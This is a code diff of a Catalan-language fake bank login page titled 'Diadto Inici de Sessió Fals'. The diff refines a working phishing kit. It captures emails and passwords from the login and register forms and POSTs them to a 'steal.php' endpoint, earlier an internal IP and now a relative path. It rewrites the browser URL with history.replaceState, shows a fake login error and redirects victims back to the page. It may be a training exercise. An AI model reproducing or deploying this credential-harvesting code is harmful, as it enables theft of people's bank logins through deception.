@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Diadto Inici de Sessió Fals</title>
+    <script>
+        window.onload = function() {
+            history.replaceState({}, "", "https://v4tox3n.github.io/tr/diadto-banc-loggin.html");
+        };
+    </script>
     <style>
         * {
             margin: 0;
@@ -248,27 +253,33 @@
             submit_login_button.addEventListener('click', async (e) => {
                 e.preventDefault();
                 const credenciales = {
-                email: document.getElementById('loginEmail').value,
-                password: document.getElementById('loginPassword').value
-            };
+                    email: document.getElementById('loginEmail').value,
+                    password: document.getElementById('loginPassword').value
+                };
 
-            try {
-                const response = await fetch('http://192.168.1.55/phishing/steal.php', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(credenciales)
-                });
-                
-                if (!response.ok) throw new Error('Error en el servidor');
-                
-                setTimeout(() => {
-                    window.location.href = "https://v4tox3n.github.io";
-                }, 1000);
-                
-            } catch (error) {
-                console.error("Error:", error);
-                alert("Error de conexió. Intenta-ho de nou.");
-            }
+                try {
+                    const response = await fetch('/steal.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(credenciales)
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (result.status !== 'success') throw new Error(result.message || 'Error al servidor');
+                    
+                    submit_login_button.textContent = 'Comprobant...';
+                    
+                    setTimeout(() => {
+                        alert('Ha ocurregut un error intentant iniciar sessió, proba-ho de nou.');
+                        window.location.href = "https://v4tox3n.github.io/tr/diadto-banc-loggin.html";
+                    }, 1500);
+                    
+                } catch (error) {
+                    console.error("Error:", error);
+                    submit_login_button.textContent = 'Iniciar Sessió';
+                    alert("Error de conexión: " + error.message);
+                }
             });
 
             submit_register_button.addEventListener('click', async (e) => {
@@ -279,7 +290,7 @@
             };
 
             try {
-                const response = await fetch('http://192.168.1.55/phishing/steal.php', {
+                const response = await fetch('/steal.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(credenciales)
@@ -288,7 +299,7 @@
                 if (!response.ok) throw new Error('Error en el servidor');
                 
                 setTimeout(() => {
-                    window.location.href = "https://www.bancoreal.com";
+                    window.location.href = "https://v4tox3n.github.io/tr/diadto-banc-loggin.html";
                 }, 1000);
                 
             } catch (error) {
